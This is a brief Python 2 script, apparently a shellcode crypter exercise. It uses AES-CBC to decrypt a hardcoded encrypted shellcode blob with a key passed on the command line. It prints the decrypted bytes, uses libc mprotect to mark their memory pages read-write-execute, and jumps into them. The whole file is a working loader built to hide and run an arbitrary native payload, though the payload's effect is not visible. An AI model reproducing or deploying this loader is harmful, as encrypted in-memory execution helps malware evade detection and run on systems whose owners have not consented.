import base64
import binascii
import sys
import ctypes
from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        #raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return (iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        #enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return (cipher.decrypt( enc[16:] ))

# DECRYPTER SECTION

encryptedShellcode="d5ff90a212dc26d97a0fa9fd5883663b4166fce26d0e986ddcc7daa1276213a54106dbeae3a3acd1137b76d69fcaf596"
encryptedShellcode=binascii.unhexlify(encryptedShellcode)

cipher = AESCipher(sys.argv[1])
decrypted = cipher.decrypt(encryptedShellcode)
print '\nDecrypted shellcode:\n'
x=bytearray(decrypted)
print binascii.hexlify(x)
print '\n\nExecuting shellcode...\n'

# PASS CONTROL TO SHELLCODE

shellcode_data=decrypted
shellcode = ctypes.create_string_buffer(shellcode_data)
function = ctypes.cast(shellcode, ctypes.CFUNCTYPE(None))

addr = ctypes.cast(function, ctypes.c_void_p).value
libc = ctypes.CDLL('libc.so.6')
pagesize = libc.getpagesize()
addr_page = (addr // pagesize) * pagesize
for page_start in range(addr_page, addr + len(shellcode_data), pagesize):
    assert libc.mprotect(page_start, pagesize, 0x7) == 0

function()
